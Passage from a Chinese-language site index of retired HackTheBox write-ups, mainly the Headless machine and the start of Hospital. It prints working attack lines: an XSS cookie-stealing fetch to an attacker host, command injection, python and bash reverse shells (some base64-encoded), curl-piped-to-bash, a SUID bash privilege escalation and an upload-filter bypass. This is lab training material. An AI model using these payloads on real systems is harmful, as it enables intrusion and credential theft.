reuest</code>\u66f4\u6539\u54cd\u5e94\uff0c\u51cf\u5c11\u5176\u5012\u6570\u65f6\u95f4\uff0c\u770b\u770b\u5012\u6570\u7ed3\u675f\u540e\u6709\u4ec0\u4e48\u4e8b\u60c5\u53d1\u751f\u3002</p> <p></p> <p>\u5c06\u54cd\u5e94\u4e2d\u7684\u9009\u4e2d\u90e8\u5206\u6539\u4e3a<code>5 * 1000</code>\uff08\u53735\u79d2\uff09\uff1a</p> <p></p> <p>\u8f6c\u53d1\u8bf7\u6c42\u540e\u7f51\u9875\u663e\u793a\u5012\u65705\u79d2\uff1a</p> <p></p> <p>\u5012\u6570\u7ed3\u675f\uff0c\u65e0\u4e8b\u53d1\u751f\uff1a</p> <p></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Headless/#xsscookie","title":"\u8868\u5355XSS\u83b7\u53d6Cookie","text":"<p>\u70b9\u51fb<code>For questions</code>\u6309\u94ae\u8df3\u8f6c\u5230<code>http://10.10.11.8:5000/support</code>\u3002\u5c1d\u8bd5XSS\uff0c\u5728\u8868\u5355\u4e2d\u586b\u5165<code>&lt;script&gt;alert(0)&lt;/script&gt;</code>\u540e\u53d1\u9001\uff0c\u7f51\u9875\u54cd\u5e94\u4e00\u4e2aWAF\u8b66\u544a\u9875\u9762\u3002</p> <p></p> <p>\u6ce8\u610f\u5230\u7f51\u9875\u4e2d\u663e\u793a\u4e86\u6211\u4eec\u7684\u8bf7\u6c42\u5934\u4fe1\u606f\u3002 \u540c\u65f6\uff0c\u89c2\u5bdf\u591a\u6b21\u8bf7\u6c42\u53ef\u4ee5\u53d1\u73b0Cookie\u503c\u662f\u56fa\u5b9a\u4e0d\u53d8\u7684\uff0c\u4e14\u53d8\u91cf\u540d\u4e3a<code>is_admin</code>\uff0c\u6240\u4ee5\u6000\u7591\u53ef\u4ee5\u83b7\u53d6admin\u7684cookie\u7136\u540e\u8bbf\u95ee\u4e4b\u524d\u663e\u793a\u201cUnauthorized\u201d\u7684<code>/dashboard</code>\u3002</p> <p>\u6240\u4ee5\u53ef\u4ee5\u5148\u6d4b\u8bd5\u4e00\u4e0b\u8bf7\u6c42\u5934\u7684XSS\u6ce8\u5165\u3002 burp\u62e6\u622a\u8bf7\u6c42\uff0c\u968f\u4fbf\u6539\u4e00\u4e2a\u7f51\u9875\u4e2d\u6709\u663e\u793a\u7684\u8bf7\u6c42\u5934\uff08\u6b64\u5904\u4fee\u6539Referer\uff09\u4e3a<code>&lt;script&gt;alert(0)&lt;/script&gt;</code>\u3002</p> <p></p> <p>\u53d1\u9001\u540e\u5f39\u51faalert\u7a97\u53e3\uff0c\u8bc1\u660e\u6709XSS\u6f0f\u6d1e\u3002</p> <p></p> <p>\u53e6\u5916\u53ef\u4ee5\u67e5\u770b\u7f51\u9875\u6e90\u7801\u53d1\u73b0HTML\u786e\u5b9e\u88ab\u4fee\u6539\u3002</p> <p></p> <p>\u63a5\u4e0b\u6765\u5c1d\u8bd5\u83b7\u53d6Cookie\u3002 kali\u7ec8\u7aef\u5f00\u542fhttp\u670d\u52a1\u3002burp\u91cd\u653e\u4e00\u4e0b\u4e4b\u524d\u7684\u8bf7\u6c42\uff0cReferer\u5934\u4f7f\u7528payload\uff1a<code>&lt;img src=x onerror=fetch('http://10.10.14.8/?c='+document.cookie);&gt;</code>\u2014\u2014\u8ba9WAF\u7684\u8b66\u544a\u754c\u9762\u52a0\u8f7d\u4e0d\u53ef\u7528\u56fe\u7247\uff0c\u89e6\u53d1<code>onerror</code>\u4f7f\u5176\u8bbf\u95eekali\u4e3b\u673a\uff0c\u5e76\u5728URL\u4e2d\u5e26\u4e0a<code>document.cookie</code>\u53c2\u6570\u2014\u2014\u6211\u4eec\u5c31\u53ef\u4ee5\u5728kali\u7ec8\u7aef\u5f97\u77e5Cookie\u3002 \u53ef\u4ee5\u53d1\u73b0admin\u7684Cookie\u4e3a\uff1a<code>ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0</code>\u3002</p> <p></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Headless/#initial-access","title":"Initial Access","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Headless/#cookie","title":"Cookie/\u4f1a\u8bdd\u56fa\u5b9a\u653b\u51fb","text":"<p>\u518d\u6b21\u8bbf\u95ee<code>http://10.10.11.8:5000/dashboard</code>\u5e76\u62e6\u622a\u8bf7\u6c42\uff0c\u53ef\u4ee5\u53d1\u73b0Cookie\u503c\u76ee\u524d\u8fd8\u662f\u6211\u4eec\u4e4b\u524d\u89c2\u5bdf\u5230\u7684\u56fa\u5b9a\u503c\u3002\u5c06\u8fd9\u4e2aCookie\u503c\u6539\u4e3a\u4e0a\u9762\u8bf4\u7684<code>ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0</code></p> <p></p> <p>\u8f6c\u53d1\u8bf7\u6c42\u540e\u6210\u529f\u8bbf\u95ee<code>/dashboard</code>\u9875\u9762\uff0c\u662f\u4e00\u4e2a\u751f\u6210\u62a5\u544a\u7684\u7f51\u9875\u3002\u70b9\u51fb<code>Generate Report</code>\u53ef\u4ee5\u53d1\u73b0\u8bf7\u6c42\u4e2d\u53d1\u9001\u4e86<code>date</code>\u53c2\u6570\u3002\u5f88\u6709\u53ef\u80fd\u53ef\u4ee5\u6267\u884c\u6ce8\u5165\u3002</p> <p></p> <p>\u5148\u770b\u770b\u6b63\u5e38\u60c5\u51b5\u4e0b\u7684\u7f51\u9875\u54cd\u5e94\uff1a</p> <p></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Headless/#poc","title":"\u53c2\u6570\u6c61\u67d3PoC","text":"<p>\u63a5\u4e0b\u6765\u5c1d\u8bd5\u4e00\u4e0b\u6ce8\u5165\u3002\u9996\u5148\u6000\u7591\u540e\u53f0\u5904\u7406\u662f\u547d\u4ee4\u884c/bash\u811a\u672c\u4e4b\u7c7b\u7684\uff08\u7531\u4e8e\u662flinux\uff09\uff0c\u4e8e\u662f\u7528\u5206\u53f7\u622a\u65ad\uff0c\u7136\u540epayload\u52a0\u4e0a<code>id</code>\u770b\u770b\u54cd\u5e94\uff1a</p> <p></p> <p>\u6210\u529f\u56de\u663e\u547d\u4ee4<code>id</code>\u7684\u7ed3\u679c\uff08\u5f53\u524d\u4e3advir\u7528\u6237\uff09\uff0c\u8bf4\u660e<code>date</code>\u53c2\u6570\u5b58\u5728\u6ce8\u5165\u3002</p> <p></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Headless/#shell","title":"\u53cd\u5f39shell","text":"<p>\u5c06payload\u6539\u4e3a<code>;echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjgiLDQ0NDQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCJiYXNoIikn |base64 -d |bash</code>\uff0c\u5176\u4e2dbase64\u90e8\u5206\u662f<code>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.8\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'</code>\u7684\u7f16\u7801\u3002 \u540e\u6765\u6d4b\u8bd5\u4e0d\u7528base64\u5f62\u5f0f\u4e5f\u53ef\u4ee5\u3002</p> <p>\u7b80\u5355exp\uff1a <pre><code>\u250c\u2500\u2500(kali\u327fkalik)-[~/Lab/HTB/Headless]\n\u2514\u2500$ curl -XPOST http://10.10.11.8:5000/dashboard -H 'Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0' -d @payload.txt \n\n\u250c\u2500\u2500(kali\u327fkalik)-[~/Lab/HTB/Headless]\n\u2514\u2500$ cat payload.txt \ndate=2023-09-15;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.8\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'\n</code></pre></p> <p>\u53d1\u9001\u540e\u6210\u529f\u83b7\u53d6dvir\u7528\u6237\u7684\u53cd\u5f39shell\uff1a <pre><code>\u2514\u2500$ nc -lvnp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.8] from (UNKNOWN) [10.10.11.8] 36340\nbash-5.2$ id\nid\nuid=1000(dvir) gid=1000(dvir) groups=1000(dvir),100(users)\n</code></pre></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Headless/#flag-user","title":"flag: user","text":"<pre><code>bash-5.2$ pwd\npwd\n/home/dvir/app\nbash-5.2$ cd ..\ncd ..\nbash-5.2$ ls\nls\napp  geckodriver.log  initdb.sh  user.txt\nbash-5.2$ cat user.txt  \ncat user.txt\n5f0 (...) 9b5\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Headless/#privilege-escalation","title":"Privilege Escalation","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Headless/#internal-recon","title":"Internal Recon","text":"<p>\u57fa\u7840\u4fe1\u606f\u6536\u96c6\u4e00\u628a\u68ad\uff1a</p> <ul> <li>IP\u3001\u7aef\u53e3</li> <li>\u7528\u6237\u5bb6\u76ee\u5f55\u7684\u9690\u85cf\u6587\u4ef6\uff1a\u65e0\u3002</li> <li><code>sudo -l</code>\uff1a\u53d1\u73b0<code>/usr/bin/syscheck</code>\u514d\u5bc6\u6267\u884c\u3002</li> <li>SUID\uff1a\u65e0\u7279\u522b\u53d1\u73b0\u3002</li> <li>cron\uff1a<code>crontab -l</code>\uff0c<code>ls /etc/cron*</code>\uff0c\u65e0\u7279\u522b\u53d1\u73b0\u3002</li> </ul> <pre><code>dvir@headless:~/app$ sudo -l\nMatching Defaults entries for dvir on headless:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    use_pty\n\nUser dvir may run the following commands on headless:\n    (ALL) NOPASSWD: /usr/bin/syscheck\n\n\ndvir@headless:~/app$ find / -perm -4000 -exec ls -l {} \\; 2&gt;/dev/null\n-rwsr-xr-x 1 root root 26776 Feb  1  2023 /usr/bin/pkexec\n-rwsr-xr-x 1 root root 62672 Mar 23  2023 /usr/bin/chfn\n-rwsr-xr-x 1 root root 59704 Mar 23  2023 /usr/bin/mount\n-rwsr-xr-x 1 root root 281624 Jun 27  2023 /usr/bin/sudo\n-rwsr-xr-x 1 root root 48896 Mar 23  2023 /usr/bin/newgrp\n-rwsr-xr-x 1 root root 35128 Mar 23  2023 /usr/bin/umount\n-rwsr-xr-x 1 root root 162752 Mar 23  2023 /usr/bin/ntfs-3g\n-rwsr-xr-x 1 root root 35128 Apr 19  2023 /usr/bin/fusermount3\n-rwsr-xr-x 1 root root 52880 Mar 23  2023 /usr/bin/chsh\n-rwsr-xr-x 1 root root 68248 Mar 23  2023 /usr/bin/passwd\n-rwsr-xr-x 1 root root 88496 Mar 23  2023 /usr/bin/gpasswd\n-rwsr-xr-x 1 root root 72000 Mar 23  2023 /usr/bin/su\n-rwsr-xr-- 1 root dip 403832 May 14  2022 /usr/sbin/pppd\n-rwsr-xr-x 1 root root 653888 Dec 19 16:51 /usr/lib/openssh/ssh-keysign\n-rwsr-xr-x 1 root root 18664 Feb  1  2023 /usr/lib/polkit-1/polkit-agent-helper-1\n-rwsr-xr-- 1 root messagebus 51272 Sep 16  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper\n-rwsr-sr-x 1 root root 14672 Jan 22 08:19 /usr/lib/xorg/Xorg.wrap\n\n\ndvir@headless:~/app$ crontab -l\n (...)\n@reboot /usr/bin/python3 /home/dvir/app/inspect_reports.py\n</code></pre> <p>\u770b\u4e00\u4e0bsudo\u514d\u5bc6\u6267\u884c\u7684<code>/usr/bin/syscheck</code>\uff1a <pre><code>bash-5.2$ cat /usr/bin/syscheck\n#!/bin/bash\n\nif [ \"$EUID\" -ne 0 ]; then\n  exit 1\nfi\n\nlast_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)\nformatted_time=$(/usr/bin/date -d \"@$last_modified_time\" +\"%d/%m/%Y %H:%M\")\n/usr/bin/echo \"Last Kernel Modification Time: $formatted_time\"\n\ndisk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')\n/usr/bin/echo \"Available disk space: $disk_space\"\n\nload_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')\n/usr/bin/echo \"System load average: $load_average\"\n\nif ! /usr/bin/pgrep -x \"initdb.sh\" &amp;&gt;/dev/null; then\n  /usr/bin/echo \"Database service is not running. Starting it...\"\n  ./initdb.sh 2&gt;/dev/null\nelse\n  /usr/bin/echo \"Database service is running.\"\nfi\n\nexit 0\n</code></pre></p> <p>\u6ce8\u610f\u5230<code>./initdb.sh</code>\u7528\u4e86\u76f8\u5bf9\u8def\u5f84\uff0c\u5982\u679c\u80fd\u521b\u5efa\u4e00\u4e2a\u540c\u540d\u6587\u4ef6\u4fbf\u53ef\u4ee5\u8f7b\u677e\u5229\u7528\u3002\u7136\u540e\u5173\u952e\u90e8\u5206\u4e3a\u67e5\u770b\u662f\u5426\u6709\u540d\u4e3a<code>initdb.sh</code>\u7684\u8fdb\u7a0b\u5728\u6267\u884c\u3002 \u5c1d\u8bd5\u4e00\u4e0b<code>pgrep</code>\u547d\u4ee4\u770b\u770b\u7ed3\u679c\uff1a <pre><code>dvir@headless:~/app$ /usr/bin/pgrep -x \"initdb.sh\"\ndvir@headless:~/app$ echo $?\n1\n</code></pre></p> <p>\u6240\u4ee5<code>syscheck</code>\u547d\u4ee4\u4f1a\u8fd0\u884c\u5230<code>./initdb.sh</code>\u7684\u90e8\u5206\uff0c\u5b9e\u9645\u6267\u884c\u4e00\u4e0b\u770b\u770b\uff1a <pre><code>dvir@headless:~/app$ sudo /usr/bin/syscheck\nLast Kernel Modification Time: 01/02/2024 10:05\nAvailable disk space: 2.0G\nSystem load average:  0.04, 0.03, 0.00\nDatabase service is not running. Starting it...\n</code></pre></p> <p>\u786e\u5b9e\u662f\uff0c\u5e76\u4e14\u5f53\u524d\u76ee\u5f55\u4e5f\u5e76\u65e0<code>./initdb.sh</code>\u6240\u4ee5\u65e0\u4e8b\u53d1\u751f\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Headless/#sudo","title":"sudo\u63d0\u6743","text":"<p>\u65b0\u5efa\u4e00\u4e2a<code>initdb.sh</code>\u6d4b\u8bd5\u4e00\u4e0b\uff0c\u8fd0\u884c<code>sudo /usr/bin/syscheck</code>\u53ef\u4ee5\u53d1\u73b0\u6700\u540e\u591a\u4e86\u4e00\u884c\u8f93\u51fa\u201ctest\u201d\uff0c\u5373\u6211\u4eec\u6307\u5b9a\u7684\u547d\u4ee4\uff1a <pre><code>dvir@headless:~/app$ cat initdb.sh \n#!/bin/bash\necho test\ndvir@headless:~/app$ ls -l initdb.sh \n-rwxr-xr-x 1 dvir dvir 22 Apr 14 10:29 initdb.sh\ndvir@headless:~/app$ sudo /usr/bin/syscheck\nLast Kernel Modification Time: 01/02/2024 10:05\nAvailable disk space: 2.0G\nSystem load average:  0.00, 0.00, 0.00\nDatabase service is not running. Starting it...\ntest\n</code></pre></p> <p>\u4fee\u6539\u811a\u672c\u540e\u63d0\u6743\uff1a <pre><code>dvir@headless:~/app$ cat initdb.sh \n#!/bin/bash\nchmod +s /bin/bash\n\ndvir@headless:~/app$ ls -l /bin/bash\n-rwxr-xr-x 1 root root 1265648 Apr 24  2023 /bin/bash\n\ndvir@headless:~/app$ sudo /usr/bin/syscheck\nLast Kernel Modification Time: 01/02/2024 10:05\nAvailable disk space: 2.0G\nSystem load average:  0.00, 0.00, 0.00\nDatabase service is not running. Starting it...\n\ndvir@headless:~/app$ ls -l /bin/bash\n-rwsr-sr-x 1 root root 1265648 Apr 24  2023 /bin/bash\n\ndvir@headless:~/app$ bash -p\nbash-5.2# id\nuid=1000(dvir) gid=1000(dvir) euid=0(root) egid=0(root) groups=0(root),100(users),1000(dvir)\n</code></pre></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Headless/#flag-root","title":"flag: root","text":"<pre><code>bash-5.2# cat /root/root.txt \n20f7 (...) 158e\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Headless/#_4","title":"\u603b\u7ed3\u00b7\u540e\u8bb0","text":"<p>2024/04/14</p> <p>\u5e94\u8be5\u7b97\u662f\u5341\u5206\u7b80\u5355\u7684\u9776\u673a\uff0c\u4f46\u662f\u7531\u4e8e\u4e00\u5f00\u59cb\u5e76\u672a\u9886\u609fXSS\u89e6\u53d1\u6761\u4ef6\u4e3a\u9700\u8981\u5148\u89e6\u53d1WAF\u8b66\u544a\u9875\u9762\u2014\u2014\u56e0\u4e3a\u62a5\u5934\u6ce8\u5165\u7684XSS\u4f1a\u5728WAF\u8b66\u544a\u9875\u9762\u56de\u663e\uff0c\u6240\u4ee5\u4e00\u5f00\u59cb\u8fd8\u5361\u4e86\u633a\u4e45\u7684\u3002\u56de\u60f3\u8d77\u6765\u6700\u521d\u770b\u5230WAF\u8b66\u544a\u65f6\uff0c\u8fde\u8b66\u544a\u9875\u9762\u7684\u5185\u5bb9\u90fd\u6ca1\u4ed4\u7ec6\u770b\uff0c\u5c31\u76f4\u63a5\u9ed8\u8ba4\u9700\u8981\u4e00\u4e9b\u9ad8\u7ea7\u6280\u5de7\u6765\u7ed5\u8fc7\uff0c\u5bf9XSS\u7ed5\u8fc7\u8fdb\u884c\u4e86\u4e00\u9635\u5927\u641c\u7279\u641c\uff0c\u7740\u5b9e\u8d70\u504f\u4e86\u3002\u6700\u540e\u610f\u8bc6\u5230\u95ee\u9898\u6240\u5728\uff0c\u4fbf\u4e00\u5207\u8c41\u7136\u5f00\u6717\uff0c\u8fc5\u901f\u62ff\u4e0b\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Headless/#shell_1","title":"\u5931\u8d25\u7684\u53cd\u5f39shell","text":"<p>\u53cd\u5f39shell\u7684\u90e8\u5206\u6700\u5f00\u59cb\u8bd5\u4e86\u4e0b<code>;bash -i &gt;&amp; /dev/tcp/10.10.14.8/4444 0&gt;&amp;1</code>\uff0c\u4ee5\u53ca\u5176\u76f8\u5173\u5f62\u5f0f\uff0c\u5982<code>;bash -c 'echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0NDQgMD4mMQ== |base64 -d |bash'</code>\u7b49\u90fd\u4e0d\u884c\u3002\u5f88\u662f\u5947\u602a\uff0c\u770b\u4e86\u4e0b\u76ee\u6807\u811a\u672c\u7684\u5904\u7406\u4e5f\u6ca1\u660e\u767d\u4e3a\u4ec0\u4e48\u3002 \u4e0d\u8fc7\u5c06\u547d\u4ee4\u884c\u5199\u5230\u811a\u672c\uff0c\u7136\u540e\u7528<code>curl &lt;attacker-ip&gt;/exp.sh |bash</code>\u7684\u5f62\u5f0f\u8c03\u7528\u662f\u53ef\u884c\u7684\u3002</p> <p>\u76f8\u5173\u811a\u672c\uff1a <pre><code>bash-5.2$ cat /home/dvir/app/app.py\n\nfrom flask import Flask, render_template, request, make_response, abort, send_file\nfrom itsdangerous import URLSafeSerializer\nimport os\nimport random\n\n (...)\n\n@app.route('/dashboard', methods=['GET', 'POST'])\ndef admin():\n    if serializer.loads(request.cookies.get('is_admin')) == \"user\":\n        return abort(401)\n\n    script_output = \"\"\n\n    if request.method == 'POST':\n        date = request.form.get('date')\n        if date:\n            script_output = os.popen(f'bash report.sh {date}').read()\n\n    return render_template('dashboard.html', script_output=script_output)\n</code></pre></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Hospital/","title":"HTB-Hospital","text":"","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Hospital/#summary","title":"Summary","text":"<p>...</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Hospital/#relevant-skills","title":"Relevant Skills","text":"<ul> <li>nmap</li> <li>\u5b50\u57df\u679a\u4e3e</li> <li>sudo\u63d0\u6743</li> <li>\u2026\u2026</li> </ul>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Hospital/#attack-path-overview","title":"Attack Path Overview","text":"","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Hospital/#external-recon-nmap","title":"External Recon - nmap","text":"<p>\u81ea\u7528\u626b\u63cf\u811a\u672c\uff1a\u5de5\u4f5c\u6d41 <code>curl -s https://raw.githubusercontent.com/TimeLess613/workflow-scan4HTB/main/workflow-scan4HTB.sh | sudo bash -s &lt;HTB-IP&gt;</code></p> <p>\u5f00\u653e\u7aef\u53e3\uff1a <pre><code>PORT     STATE SERVICE           VERSION\n22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)\n53/tcp   open  domain            Simple DNS Plus\n88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-11-19 13:10:31Z)\n135/tcp  open  msrpc             Microsoft Windows RPC\n139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn\n389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)\n443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  ldapssl?\n1801/tcp open  msmq?\n2103/tcp open  msrpc             Microsoft Windows RPC\n2105/tcp open  msrpc             Microsoft Windows RPC\n2107/tcp open  msrpc             Microsoft Windows RPC\n2179/tcp open  vmrdp?\n3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)\n3269/tcp open  globalcatLDAPssl?\n3389/tcp open  ms-wbt-server     Microsoft Terminal Services\n5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n6159/tcp open  msrpc             Microsoft Windows RPC\n6404/tcp open  msrpc             Microsoft Windows RPC\n6406/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0\n6407/tcp open  msrpc             Microsoft Windows RPC\n6409/tcp open  msrpc             Microsoft Windows RPC\n6613/tcp open  msrpc             Microsoft Windows RPC\n6633/tcp open  msrpc             Microsoft Windows RPC\n8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))\n9389/tcp open  mc-nmf            .NET Message Framing\n</code></pre></p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Hospital/#_1","title":"\u653b\u51fb\u8def\u5f84\u89c4\u5212\u00b7\u6f0f\u6d1e\u5206\u6790","text":"<p>\u5e38\u89c4Windows\u57df\u63a7\u9776\u673a\u3002\u57fa\u672c\u601d\u8def\u540cHTB-Authority\u7684\u3002\u5373SMB\u2014\u2014&gt;WEB (\u2014\u2014&gt;LDAP\u2014\u2014&gt;RPC)\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Hospital/#smb-","title":"SMB - \u533f\u540d","text":"<p>\u533f\u540d\u65e0\u6cd5\u5217\u51fa\u5171\u4eab\u3002\u60f3\u7740\u53ef\u80fd\u662f\u7aef\u53e3\u95ee\u9898\u4e8e\u662f\u987a\u4fbf\u5c1d\u8bd5\u4e86139\u7aef\u53e3\uff0c\u7ed3\u679c\u4e5f\u4e0d\u884c\uff1a <pre><code>\u2514\u2500$ smbclient -L //10.10.11.241 -N              \nsession setup failed: NT_STATUS_ACCESS_DENIED\n\n\u2514\u2500$ smbclient -L //10.10.11.241 -N -p 139\ndo_connect: Connection to 10.10.11.241 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\n</code></pre></p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Hospital/#443-","title":"443\u7aef\u53e3 - \u65e0\u51ed\u636e","text":"<p>\u8bbf\u95ee <code>https://10.10.11.241/</code>\uff0c\u662f\u4e00\u4e2a\u201cHospital Webmail\u201d\u7684\u767b\u5f55\u754c\u9762\u3002</p> <ul> <li>robots.txt\uff1a\u65e0</li> <li>.git/config\uff1a\u65e0</li> <li>\u7f51\u9875\u4fe1\u606f\uff1a\u65e0\u7279\u522b\u53d1\u73b0</li> <li>\u7f51\u9875\u529f\u80fd\uff1a\u767b\u5f55\u754c\u9762</li> <li>\u7f51\u9875\u6e90\u7801\uff1a\u65e0\u7279\u522b\u53d1\u73b0</li> <li>\u5b50\u57df\u679a\u4e3e\uff1a\u65e0\u57df\u540d</li> <li>\u76ee\u5f55\u679a\u4e3e\uff1a\u5c1d\u8bd5 <code>gobuster dir -u https://10.10.11.241 -w &lt;wordlists&gt; -k</code> \u62a5\u9519\u3002</li> </ul>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Hospital/#8080","title":"8080\u7aef\u53e3","text":"<p>\u6ce8\u610f\u52308080\u7aef\u53e3\u662f\u4e2aApache HTTP\u670d\u52a1\uff0c\u8bbf\u95ee <code>http://10.10.11.241:8080</code>\uff0c\u4e5f\u662f\u4e00\u4e2a\u767b\u5f55\u754c\u9762\u3002</p> <ul> <li>robots.txt\uff1a\u65e0</li> <li>.git/config\uff1a\u65e0</li> <li>\u7f51\u9875\u4fe1\u606f\uff1a\u65e0\u7279\u522b\u53d1\u73b0</li> <li>\u7f51\u9875\u529f\u80fd\uff1a\u767b\u5f55\u754c\u9762\u3002\u6709\u4e2a\u6ce8\u518c\u6309\u94ae</li> <li>\u7f51\u9875\u6e90\u7801\uff1a\u65e0\u7279\u522b\u53d1\u73b0</li> <li>\u5b50\u57df\u679a\u4e3e\uff1a\u65e0\u57df\u540d</li> <li>\u76ee\u5f55\u679a\u4e3e\uff1a\u6709 <code>uploads</code> \u7b49\u6587\u4ef6\u5939\u3002\u76f4\u63a5\u8bbf\u95ee\u54cd\u5e94403</li> </ul> <p>443\u7aef\u53e3\u7b97\u4f5c\u4e3b\u7ad9\u7684\u8bdd\uff0c\u8fd9\u4e2a8080\u7aef\u53e3\u7684\u65c1\u7ad9\u4f30\u8ba1\u662f\u4e2a\u7a81\u7834\u53e3\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Hospital/#-","title":"\u7814\u7a76\u7f51\u9875\u529f\u80fd - \u6587\u4ef6\u4e0a\u4f20","text":"<p>\u6ce8\u518c\u8d26\u53f7\u540e\u53ef\u4ee5\u767b\u9646\u3002\u663e\u793a\u4e00\u4e2a\u4e0a\u4f20\u754c\u9762\u3002\u9ed8\u8ba4\u53ea\u80fd\u4e0a\u4f20\u56fe\u7247\u3002\u4f30\u8ba1\u53ef\u4ee5\u7ed5\u8fc7\u4e0a\u4f20webshell\uff1f</p> <p></p> <p>\u5f00\u542fBurp\u62e6\u622a\uff0c\u66f4\u6539webshell\u6587\u4ef6\u7684\u6269\u5c55\u540d\u4ee5.jpg\u7ed3\u5c3e\uff0c\u7136\u540e\u62e6\u622a\u8bf7\u6c42\u5305\u5220\u6389.jpg\u3002</p> <ul> <li>\u4e0a\u4f20kali\u81ea\u5e26\u7684php\u53cd\u5f39shell\u3002\u7ed3\u679c\u62a5\u9519\u3002</li> <li>\u8bd5\u4e86\u4e0b\u8fd9\u4e2awebshell\uff0c\u6269\u5c55\u540d\u6539\u4e3a <code>phar</code>\u3002\u6210\u529f\u4e0a\u4f20\u3002</li> </ul>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Hospital/#_2","title":"\u5173\u4e8e\u7a7a\u5b57\u8282\u7ed5\u8fc7","text":"<p><code>\\x00</code> \u7a7a\u5b57\u8282\u7ed5\u8fc7\u80fd\u663e\u793a\u4e0a\u4f20\u6210\u529f\uff0c\u4f46\u662f\u65e0\u6cd5\u7528URL\u8bbf\u95ee\u3002\u540e\u6765getshell\u8fdb\u53bb\u4e4b\u540e\u770b\u5230\u4e86\u8fd9\u4e2a\u6587\u4ef6\u4e0a\u4f20\u88ab\u4fdd\u5b58\u4e3a <code>x00.jpg</code> \u4e86\u3002\u770b\u4e86\u773c <code>upload.php</code> \u7684\u4ee3\u7801\u4e5f\u6ca1\u80fd\u7406\u89e3\u4e3a\u4ec0\u4e48\u6587\u4ef6\u540d\u53d6\u4e86 <code>x00</code> \u7684\u90e8\u5206\u2026\u2026 <pre><code>&lt;?php\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n\n    if (isset($_FILES['image'])) {\n        $blockedExtensions = ['php', 'php1', 'php2', 'php3', 'php4', 'php5', 'php6', 'php7', 'php8', 'phtml', 'html', 'aspx', 'asp'];\n        $uploadDirectory = 'uploads/';\n        $uploadedFile = $uploadDirectory . basename($_FILES['image']['name']);\n        $fileExtension = strtolower(pathinfo($uploadedFile, 